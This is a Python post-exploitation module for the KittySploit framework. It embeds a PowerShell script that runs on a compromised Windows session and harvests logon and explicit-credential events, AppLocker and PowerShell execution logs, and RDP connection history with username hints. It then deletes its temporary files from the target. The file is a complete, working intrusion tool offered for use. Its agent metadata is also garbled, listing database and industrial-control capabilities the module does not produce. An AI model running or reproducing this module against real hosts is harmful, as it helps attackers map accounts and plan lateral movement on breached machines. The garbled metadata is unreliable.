#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.post.windows.session import WindowsSessionMixin
import re


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows Gather Computer Detail",
        "description": "Runs Get-ComputerDetail on a Windows shell or Meterpreter session to collect logon, PowerShell, AppLocker, and RDP client artifacts.",
        "author": "KittySploit Team / Joe Bialek",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "http://clymb3r.wordpress.com/",
            "https://github.com/clymb3r/PowerShell",
        ],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    to_string = OptBool(True, "Return plain-text output instead of JSON", False)
    cleanup = OptBool(True, "Remove temporary files from the remote host", False)

    def _powershell_script(self) -> str:
        return r"""
function Get-ComputerDetail
{
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    Param(
        [Parameter(Position=0)]
        [Switch]
        $ToString
    )

    # Soft mode: Security log / HKU often deny non-admin; still return partial data
    Set-StrictMode -Off
    $ErrorActionPreference = 'SilentlyContinue'

    $SecurityLog = @()
    $SecurityLogNote = $null
    try {
        $SecurityLog = @(Get-EventLog -LogName Security -ErrorAction Stop)
    } catch {
        $SecurityLogNote = "[!] Security event log inaccessible (need admin / SeSecurityPrivilege): $($_.Exception.Message)"
    }
    $Filtered4624 = Find-4624Logon $SecurityLog
    $Filtered4648 = Find-4648Logon $SecurityLog
    $AppLockerLogs = Find-AppLockerLog
    $PSLogs = Find-PSScriptsInPSAppLog
    $RdpClientData = Find-RDPClientConnection

    if ($ToString)
    {
        if ($SecurityLogNote) { Write-Output $SecurityLogNote }
        Write-Output "Event ID 4624 (Logon):"
        Write-Output $Filtered4624.Values | Format-List
        Write-Output "Event ID 4648 (Explicit Credential Logon):"
        Write-Output $Filtered4648.Values | Format-List
        Write-Output "AppLocker Process Starts:"
        Write-Output $AppLockerLogs.Values | Format-List
        Write-Output "PowerShell Script Executions:"
        Write-Output $PSLogs.Values | Format-List
        Write-Output "RDP Client Data:"
        Write-Output $RdpClientData.Values | Format-List
    }
    else
    {
        $Properties = @{
            LogonEvent4624 = $Filtered4624.Values
            LogonEvent4648 = $Filtered4648.Values
            AppLockerProcessStart = $AppLockerLogs.Values
            PowerShellScriptStart = $PSLogs.Values
            RdpClientData = $RdpClientData.Values
        }

        $ReturnObj = New-Object PSObject -Property $Properties
        return $ReturnObj
    }
}

function Find-4648Logon
{
    Param(
        $SecurityLog
    )

    if ($null -eq $SecurityLog) { $SecurityLog = @() }
    $ExplicitLogons = @($SecurityLog | Where-Object { $_.InstanceID -eq 4648 })
    $ReturnInfo = @{}

    foreach ($ExplicitLogon in $ExplicitLogons)
    {
        $Subject = $false
        $AccountWhosCredsUsed = $false
        $TargetServer = $false
        $SourceAccountName = ""
        $SourceAccountDomain = ""
        $TargetAccountName = ""
        $TargetAccountDomain = ""
        $TargetServer = ""
        foreach ($line in $ExplicitLogon.Message -split "\r\n")
        {
            if ($line -cmatch "^Subject:$")
            {
                $Subject = $true
            }
            elseif ($line -cmatch "^Account\sWhose\sCredentials\sWere\sUsed:$")
            {
                $Subject = $false
                $AccountWhosCredsUsed = $true
            }
            elseif ($line -cmatch "^Target\sServer:")
            {
                $AccountWhosCredsUsed = $false
                $TargetServer = $true
            }
            elseif ($Subject -eq $true)
            {
                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                {
                    $SourceAccountName = $Matches[1]
                }
                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                {
                    $SourceAccountDomain = $Matches[1]
                }
            }
            elseif ($AccountWhosCredsUsed -eq $true)
            {
                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                {
                    $TargetAccountName = $Matches[1]
                }
                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                {
                    $TargetAccountDomain = $Matches[1]
                }
            }
            elseif ($TargetServer -eq $true)
            {
                if ($line -cmatch "\s+Target\sServer\sName:\s+(\S.*)")
                {
                    $TargetServer = $Matches[1]
                }
            }
        }

        if (-not ($TargetAccountName -cmatch "^DWM-.*" -and $TargetAccountDomain -cmatch "^Window\sManager$"))
        {
            $Key = $SourceAccountName + $SourceAccountDomain + $TargetAccountName + $TargetAccountDomain + $TargetServer
            if (-not $ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    LogType = 4648
                    LogSource = "Security"
                    SourceAccountName = $SourceAccountName
                    SourceDomainName = $SourceAccountDomain
                    TargetAccountName = $TargetAccountName
                    TargetDomainName = $TargetAccountDomain
                    TargetServer = $TargetServer
                    Count = 1
                    Times = @($ExplicitLogon.TimeGenerated)
                }

                $ResultObj = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $ResultObj)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                $ReturnInfo[$Key].Times += ,$ExplicitLogon.TimeGenerated
            }
        }
    }

    return $ReturnInfo
}

function Find-4624Logon
{
    Param (
        $SecurityLog
    )

    if ($null -eq $SecurityLog) { $SecurityLog = @() }
    $Logons = @($SecurityLog | Where-Object { $_.InstanceID -eq 4624 })
    $ReturnInfo = @{}

    foreach ($Logon in $Logons)
    {
        $SubjectSection = $false
        $NewLogonSection = $false
        $NetworkInformationSection = $false
        $AccountName = ""
        $AccountDomain = ""
        $LogonType = ""
        $NewLogonAccountName = ""
        $NewLogonAccountDomain = ""
        $WorkstationName = ""
        $SourceNetworkAddress = ""
        $SourcePort = ""

        foreach ($line in $Logon.Message -Split "\r\n")
        {
            if ($line -cmatch "^Subject:$")
            {
                $SubjectSection = $true
            }
            elseif ($line -cmatch "^Logon\sType:\s+(\S.*)")
            {
                $LogonType = $Matches[1]
            }
            elseif ($line -cmatch "^New\sLogon:$")
            {
                $SubjectSection = $false
                $NewLogonSection = $true
            }
            elseif ($line -cmatch "^Network\sInformation:$")
            {
                $NewLogonSection = $false
                $NetworkInformationSection = $true
            }
            elseif ($SubjectSection)
            {
                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                {
                    $AccountName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                {
                    $AccountDomain = $Matches[1]
                }
            }
            elseif ($NewLogonSection)
            {
                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                {
                    $NewLogonAccountName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                {
                    $NewLogonAccountDomain = $Matches[1]
                }
            }
            elseif ($NetworkInformationSection)
            {
                if ($line -cmatch "^\s+Workstation\sName:\s+(\S.*)")
                {
                    $WorkstationName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Source\sNetwork\sAddress:\s+(\S.*)")
                {
                    $SourceNetworkAddress = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Source\sPort:\s+(\S.*)")
                {
                    $SourcePort = $Matches[1]
                }
            }
        }

        if (-not ($NewLogonAccountDomain -cmatch "NT\sAUTHORITY" -or $NewLogonAccountDomain -cmatch "Window\sManager"))
        {
            $Key = $AccountName + $AccountDomain + $NewLogonAccountName + $NewLogonAccountDomain + $LogonType + $WorkstationName + $SourceNetworkAddress + $SourcePort
            if (-not $ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    LogType = 4624
                    LogSource = "Security"
                    SourceAccountName = $AccountName
                    SourceDomainName = $AccountDomain
                    NewLogonAccountName = $NewLogonAccountName
                    NewLogonAccountDomain = $NewLogonAccountDomain
                    LogonType = $LogonType
                    WorkstationName = $WorkstationName
                    SourceNetworkAddress = $SourceNetworkAddress
                    SourcePort = $SourcePort
                    Count = 1
                    Times = @($Logon.TimeGenerated)
                }

                $ResultObj = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $ResultObj)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                $ReturnInfo[$Key].Times += ,$Logon.TimeGenerated
            }
        }
    }

    return $ReturnInfo
}

function Find-AppLockerLog
{
    $ReturnInfo = @{}

    $AppLockerLogs = Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -ErrorAction SilentlyContinue | Where-Object {$_.Id -eq 8002}

    foreach ($Log in $AppLockerLogs)
    {
        $SID = New-Object System.Security.Principal.SecurityIdentifier($Log.Properties[7].Value)
        $UserName = $SID.Translate([System.Security.Principal.NTAccount])
        $ExeName = $Log.Properties[10].Value
        $Key = $UserName.ToString() + "::::" + $ExeName

        if (!$ReturnInfo.ContainsKey($Key))
        {
            $Properties = @{
                Exe = $ExeName
                User = $UserName.Value
                Count = 1
                Times = @($Log.TimeCreated)
            }

            $Item = New-Object PSObject -Property $Properties
            $ReturnInfo.Add($Key, $Item)
        }
        else
        {
            $ReturnInfo[$Key].Count++
            $ReturnInfo[$Key].Times += ,$Log.TimeCreated
        }
    }

    return $ReturnInfo
}

Function Find-PSScriptsInPSAppLog
{
    $ReturnInfo = @{}
    $Logs = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue | Where-Object {$_.Id -eq 4100}

    foreach ($Log in $Logs)
    {
        $LogDetails = $Log.Message -split "`r`n"
        $FoundScriptName = $false
        $User = ""

        foreach($Line in $LogDetails)
        {
            if ($Line -imatch "^\s*Script\sName\s=\s(.+)")
            {
                $ScriptName = $Matches[1]
                $FoundScriptName = $true
            }
            elseif ($Line -imatch "^\s*User\s=\s(.*)")
            {
                $User = $Matches[1]
            }
        }

        if ($FoundScriptName)
        {
            $Key = $ScriptName + "::::" + $User

            if (!$ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    ScriptName = $ScriptName
                    UserName = $User
                    Count = 1
                    Times = @($Log.TimeCreated)
                }

                $Item = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $Item)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                $ReturnInfo[$Key].Times += ,$Log.TimeCreated
            }
        }
    }

    return $ReturnInfo
}

Function Find-RDPClientConnection
{
    $ReturnInfo = @{}

    New-PSDrive -Name HKU -PSProvider Registry -Root Registry::HKEY_USERS -ErrorAction SilentlyContinue | Out-Null

    $Users = @(Get-ChildItem -Path "HKU:\" -ErrorAction SilentlyContinue)
    foreach ($UserSid in $Users.PSChildName)
    {
        $Servers = Get-ChildItem "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue

        foreach ($Server in $Servers)
        {
            $Server = $Server.PSChildName
            $UsernameHint = (Get-ItemProperty -Path "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers\$($Server)").UsernameHint
            $Key = $UserSid + "::::" + $Server + "::::" + $UsernameHint

            if (!$ReturnInfo.ContainsKey($Key))
            {
                $SIDObj = New-Object System.Security.Principal.SecurityIdentifier($UserSid)
                $User = ($SIDObj.Translate([System.Security.Principal.NTAccount])).Value

                $Properties = @{
                    CurrentUser = $User
                    Server = $Server
                    UsernameHint = $UsernameHint
                }

                $Item = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $Item)
            }
        }
    }

    return $ReturnInfo
}
"""

    def check(self):
        return self.win_require_powershell()

    def run(self):
        print_status("Preparing Get-ComputerDetail PowerShell payload...")
        temp_dir = self.win_remote_temp_dir()
        script_path, blob_path = self.win_write_remote_script(
            self._powershell_script(),
            temp_dir,
            "computer_detail",
        )
        output_path = f"{temp_dir}\\computer_detail.out"
        script_q = self.win_ps_single_quote(script_path)
        out_q = self.win_ps_single_quote(output_path)

        print_status("Running Get-ComputerDetail on the target...")
        # Always write something to the out file (partial results / privilege notes)
        if self.to_string:
            body = (
                f"$r = Get-ComputerDetail -ToString | Out-String;"
                f"if (-not $r) {{ $r = 'Get-ComputerDetail: no data (check privileges for Security log / HKU).' }};"
                f"$r | Out-File -FilePath '{out_q}' -Width 4096 -Encoding UTF8"
            )
        else:
            body = (
                f"$r = Get-ComputerDetail | ConvertTo-Json -Depth 6;"
                f"if (-not $r) {{ $r = '{{}}' }};"
                f"$r | Out-File -FilePath '{out_q}' -Width 4096 -Encoding UTF8"
            )
        invoke = (
            "$ProgressPreference='SilentlyContinue';$ErrorActionPreference='Continue';"
            f". '{script_q}';"
            "try { "
            + body
            + " } catch { $_ | Out-File -FilePath '"
            + out_q
            + "' -Width 4096 -Encoding UTF8 }"
        )
        run_output = self.win_run_powershell(invoke, timeout=120)
        if run_output and re.search(
            r"(Exception|cannot find|is not recognized|error|inaccessible|denied)",
            run_output,
            re.I,
        ):
            print_warning(run_output)

        result = (self.win_read_remote_text(output_path, timeout=60) or "").strip()
        # Fallback: some hosts only return pipeline text and never create the file
        if not result and run_output and "<Objs " not in run_output:
            result = run_output.strip()

        if self.cleanup:
            print_status("Cleaning up temporary artifacts...")
            self.win_delete_remote([script_path, blob_path, output_path])

        if not result:
            raise ProcedureError(
                FailureType.Unknown,
                "No output was returned. The target may block access to one or more event logs.",
            )

        print_success("Get-ComputerDetail completed")
        print_info(result)
        return True
